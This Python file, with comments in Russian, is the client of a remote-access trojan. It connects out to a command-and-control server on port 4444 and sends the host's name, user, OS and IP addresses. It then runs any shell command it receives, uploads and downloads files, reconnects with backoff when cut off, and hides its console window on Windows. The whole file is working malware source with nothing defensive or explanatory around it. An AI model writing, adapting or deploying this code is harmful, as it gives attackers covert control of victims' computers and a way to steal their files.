import socket
import json
import struct
import os
import platform
import getpass
import subprocess
import sys
import time
import requests

SERVER_HOST = "IP С2 Сервера"
SERVER_PORT = 4444
RECONNECT_MAX_DELAY = 60  # сек

# === UTF-8 для Windows консоли ===
if os.name == "nt":
    try:
        os.system("chcp 65001 > nul")
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except:
        pass

def send_data(sock, data):
    """Отправка байтов"""
    data_bytes = data.encode("utf-8") if isinstance(data, str) else data
    sock.send(struct.pack(">I", len(data_bytes)))
    sock.sendall(data_bytes)

def recv_data(sock):
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = struct.unpack(">I", raw_len)[0]
    data = b""
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unknown"

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except:
        ip = "Unknown"
    finally:
        s.close()
    return ip

def run_command(command, cwd):
    """Возвращаем только байты, без декодирования"""
    try:
        proc = subprocess.Popen(
            command, shell=True, cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        out, err = proc.communicate()
        return out + err
    except Exception as e:
        return f"[ERROR] {e}".encode("utf-8")

def client_loop(sock):
    cwd_file = os.path.join(os.getenv("APPDATA") if os.name=="nt" else os.getcwd(), "cwd.txt")
    cwd = os.getcwd()
    if os.path.exists(cwd_file):
        try:
            with open(cwd_file, "r", encoding="utf-8") as f:
                cwd = f.read()
        except:
            pass

    while True:
        data = recv_data(sock)
        if not data:
            break
        command = data.decode("utf-8", errors="replace").strip()

        if command.startswith("cd "):
            path = command[3:].strip()
            try:
                if path == "~":
                    path = os.path.expanduser("~")
                os.chdir(path)
                cwd = os.getcwd()
                with open(cwd_file, "w", encoding="utf-8") as f:
                    f.write(cwd)
                send_data(sock, f"Changed directory to {cwd}")
            except Exception as e:
                send_data(sock, f"[ERROR] {e}")

        elif command.startswith("__upload__ "):
            remote_file = command.split(" ", 1)[1]
            file_data = recv_data(sock)
            if file_data:
                try:
                    with open(remote_file, "wb") as f:
                        f.write(file_data)
                    send_data(sock, f"Uploaded {remote_file}")
                except Exception as e:
                    send_data(sock, f"[ERROR] {e}")
            else:
                send_data(sock, "[ERROR] Нет данных для загрузки")

        elif command.startswith("download "):
            remote_file = command.split(" ", 1)[1]
            try:
                with open(remote_file, "rb") as f:
                    send_data(sock, f.read())
            except Exception as e:
                send_data(sock, f"[ERROR] {e}")

        else:
            output = run_command(command, cwd)
            send_data(sock, output)

def connect_and_run():
    delay = 1
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))

            client_info = {
                "name": platform.node(),
                "user": getpass.getuser(),
                "os": f"{platform.system()} {platform.release()}",
                "ip": get_local_ip(),
                "public_ip": get_public_ip()
            }

            send_data(sock, json.dumps(client_info))
            client_loop(sock)

        except:
            if sock:
                try: sock.close()
                except: pass
            time.sleep(delay)
            delay = min(delay * 2, RECONNECT_MAX_DELAY)
        else:
            delay = 1  # сброс экспоненты после успешного соединения

if __name__ == "__main__":
    # Скрываем консоль на Windows
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    connect_and_run()
